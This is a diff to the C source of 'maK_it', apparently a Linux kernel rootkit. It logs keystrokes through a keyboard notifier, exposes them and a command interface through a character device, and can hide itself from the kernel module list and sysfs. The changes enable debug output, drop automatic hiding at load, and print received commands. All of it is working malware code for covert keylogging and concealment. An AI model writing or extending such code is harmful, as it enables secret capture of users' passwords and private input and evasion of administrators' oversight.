@@ -53,7 +53,7 @@ static struct list_head *modKobjList;
 /*
  * --Debug Prints--
  */
-int debug = 0;
+int debug = 1;
 
 //Key press without shift
 static const char* keys[] = {"","[ESC]","1","2","3","4","5","6","7","8","9",
@@ -152,7 +152,10 @@ void hide_module(void){
 //revealing the kernel module
 void reveal_module(void){
 	int returnVal;
-	list_add(&THIS_MODULE->list, modKobjList);
+	if(modHidden == 0){
+		return;
+	}
+	list_add(&THIS_MODULE->list, modList);
 	returnVal = kobject_add(&THIS_MODULE->mkobj.kobj, 
 				THIS_MODULE->mkobj.kobj.parent,DEVICE_NAME);
         modHidden = 0;
@@ -169,7 +172,7 @@ ssize_t read_dev(struct file *filp, char __user *buf, size_t count,
 	int result;
 	char* buffer;
 	if(debug == 1)
-		printk(KERN_ALERT "maKit: read_dev executed!\n");
+		printk(KERN_ALERT "maK_it: read_dev executed!\n");
 	key = 0;
 	buffer = keyBuffer;
 	while(*buffer != '\0'){
@@ -198,12 +201,14 @@ static ssize_t write_dev(struct file *filp, const char *buff,
 	i = 0;
 	//This section handles our commands.
 	if(len < MAX_CMD_LENGTH){
+		memset(commands, 0, sizeof(commands));
 		while(cmdPtr != cmdEndPtr){
 			c = *cmdPtr;
 			commands[i] = c;
 			cmdPtr++;
 			i++;
 		}
+		printk(KERN_ALERT "maK_it: command: %s \n",commands);
 		if(strcmp(commands, "debug") == 0){
 			if(debug == 0){ debug = 1;}
 			else{ debug = 0;}
@@ -259,8 +264,6 @@ static struct notifier_block nb = {
  */
 
 static int init_mod(void){
-	//On initiation, hide our module
-	hide_module();
 	//Listen for keys.
 	register_keyboard_notifier(&nb);
 	sema_init(&s, 1);        
@@ -281,7 +284,7 @@ static int init_mod(void){
 static void exit_mod(void){
 	//Cleaning up on exit
 	if(debug == 1)
-		printk(KERN_ALERT "maKit: Exiting module. \n");
+		printk(KERN_ALERT "maK_it: Exiting module. \n");
 	unregister_keyboard_notifier(&nb);
 	unregister_chrdev(DEVICE_MAJOR, DEVICE_NAME);
 	memset(keyBuffer, 0, sizeof(keyBuffer));
